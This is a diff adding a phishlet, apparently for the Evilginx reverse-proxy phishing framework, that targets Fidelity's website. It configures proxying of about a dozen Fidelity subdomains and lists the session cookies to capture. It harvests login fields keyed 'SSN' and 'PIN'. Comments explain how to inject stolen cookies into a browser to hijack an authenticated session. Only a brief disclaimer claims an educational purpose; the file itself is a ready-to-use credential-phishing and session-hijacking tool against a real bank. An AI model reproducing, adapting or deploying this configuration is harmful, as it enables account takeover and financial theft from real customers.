@@ -1,0 +1,117 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'fidelity.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'cfa', orig_sub: 'cfa', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'dmt', orig_sub: 'dmt', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'digital', orig_sub: 'digital', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'dpservice', orig_sub: 'dpservice', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'oltx', orig_sub: 'oltx', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'clix', orig_sub: 'clix', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'servicemessages', orig_sub: 'servicemessages', domain: 'fidelity.com', session: true, is_landing: false}
+  - {phish_sub: 'scs', orig_sub: 'scs', domain: 'fidelity.com', session: true, auto_filter: true, is_landing: false}
+
+
+sub_filters:
+  - {triggers_on: 'www.fidelity.com', orig_sub: 'www', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.fidelity.com', orig_sub: 'www', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.fidelity.com', orig_sub: 'www', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'login.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'oltx.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cfa.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dmt.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'digital.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dpservice.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'servicemessages.fidelity.com', orig_sub: '', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'login.fidelity.com', orig_sub: 'login', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'login.fidelity.com', orig_sub: 'login', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'login.fidelity.com', orig_sub: 'login', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cfa.fidelity.com', orig_sub: 'cfa', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cfa.fidelity.com', orig_sub: 'cfa', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cfa.fidelity.com', orig_sub: 'cfa', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'assets.fidelity.com', orig_sub: 'assets', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'assets.fidelity.com', orig_sub: 'assets', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'assets.fidelity.com', orig_sub: 'assets', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dmt.fidelity.com', orig_sub: 'dmt', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dmt.fidelity.com', orig_sub: 'dmt', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dmt.fidelity.com', orig_sub: 'dmt', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'digital.fidelity.com', orig_sub: 'digital', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'digital.fidelity.com', orig_sub: 'digital', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'digital.fidelity.com', orig_sub: 'digital', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dpservice.fidelity.com', orig_sub: 'dpservice', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dpservice.fidelity.com', orig_sub: 'dpservice', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'dpservice.fidelity.com', orig_sub: 'dpservice', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'oltx.fidelity.com', orig_sub: 'oltx', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'oltx.fidelity.com', orig_sub: 'oltx', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'oltx.fidelity.com', orig_sub: 'oltx', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'clix.fidelity.com', orig_sub: 'clix', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'clix.fidelity.com', orig_sub: 'clix', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'clix.fidelity.com', orig_sub: 'clix', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'servicemessages.fidelity.com', orig_sub: 'servicemessages', domain: 'fidelity.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'servicemessages.fidelity.com', orig_sub: 'servicemessages', domain: 'fidelity.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'servicemessages.fidelity.com', orig_sub: 'servicemessages', domain: 'fidelity.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+
+auth_tokens:
+  - domain: '.fidelity.com'
+    keys: ['ATC', 'uuid', '.*,regexp']  
+  - domain: 'login.fidelity.com'
+    keys: ['FSPS', 'JSESSIONID', 'LC', '.*,regexp']
+  - domain: 'www.fidelity.com'
+    keys: ['ia', 'akaas_www_AWS_AS_NL', '.*,regexp']    
+  - domain: 'cfa.fidelity.com'
+    keys: ['thx_guid', 'tmx_guid', '.*,regexp']
+  - domain: 'digital.fidelity.com'
+    keys: ['_dpcs.notebook.csrf', 'zpc', '.*,regexp']   
+  - domain: 'assets.fidelity.com'
+    keys: ['akaalb_assets_ALB', '.*,regexp']
+  - domain: 'oltx.fidelity.com'
+    keys: ['JSESSIONID', 'akaalb_oltx_ALB', '.*,regexp']
+
+# Use `EditThisCookie` in chrome and `EditThisCookie2` in firefox to successfully inject the cookies. 
+# After injecting cookies manually
+# Go to this url to get the session (Sessions have a some specific time , after that they get timeout and you won't be able to login)
+# Sessions have some specific time allowed, after that they gets expired from server side , So you should keep that in mind.
+# https://oltx.fidelity.com/ 
+
+
+auth_urls:
+  - '/ftgw/fbc/oftop/portfolio'
+  - '/ftgw/fbc/oftop/portfolio#summary/.*'
+  - '/ftgw/fbc/oftop/'
+
+  
+# https://oltx.fidelity.com/ftgw/fbc/oftop/portfolio#summary/Z20500539
+
+credentials:
+  username:
+    key: 'SSN'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'PIN'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/ftgw/Fas/Fidelity/RtlCust/Login/Response/dj.chf.ra'
+    force:
+      - {key: 'SavedIdInd', value: 'Y'}
+    type: 'post'
+    
+login:
+  domain: 'www.fidelity.com'
+  path: '/'
+#  domain: 'login.fidelity.com'
+#  path: '/ftgw/Fidelity/RtlCust/Login/Init'
